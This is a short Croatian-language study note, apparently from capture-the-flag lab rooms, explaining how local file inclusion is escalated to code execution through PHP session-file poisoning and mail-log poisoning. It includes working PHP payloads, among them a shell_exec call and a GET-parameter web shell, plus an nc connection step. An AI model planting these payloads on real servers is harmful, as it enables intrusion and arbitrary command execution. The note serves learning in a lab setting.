Generalna ideja oko LFI2RCE (local file inclusion to remote file execution) se koristi tako da se pošalje neki kod na stranicu i onda da se ta stranica rendera i usput izvrši kod koji se poslao.
Najcesci primjer toga su kada stranica prima naš input i negdje ga sprema, poput logova, ako uspijemo pristupiti mjestu gdje se oni skladište i da ih izvršimo.
Primjer iz ove sobe:
Session files
imamo polje za input koje pamti nasu vrijednost i sprema ga u datoteku /var/lib/php/sessions/sess_[sessionID].
Kada napisemo <?php echo phpinfo(); ?> i posaljemo, pri pristupu /var/lib/php/sessions/sess_[sessionID] dobivamo phpinfo().
Alternativno ako zelimo specifican ispis saljemo <?php echo shell_exec('whoami'); ?> i zamjenimo naredbu sa kojom trebamo.
Logovi
Spojimo se preko telneta ili nc na ip adresu preko nc 10.10.10.10 80
Pronađemo način da posaljemo podatak tamo i nakon toga tražimo gdje se ti podatci drze na serveru.
Nekada su to email logovi i slicno.
Primjer iz sobe Include:
Spremljeni su logovi u datoteci /var/log/mail.log i posto znamo to, mozemo se spojiti na smtp servis sa telnetom i poslati mail koji ce u sebi sadržavati php shell.
Mozemo staviti i ovakav shell <?php system($_GET['cmd']); echo 'Shell done!'; ?> koji ce traziti ?cmd=naredba, te ce ju izvrsiti kada se ispise.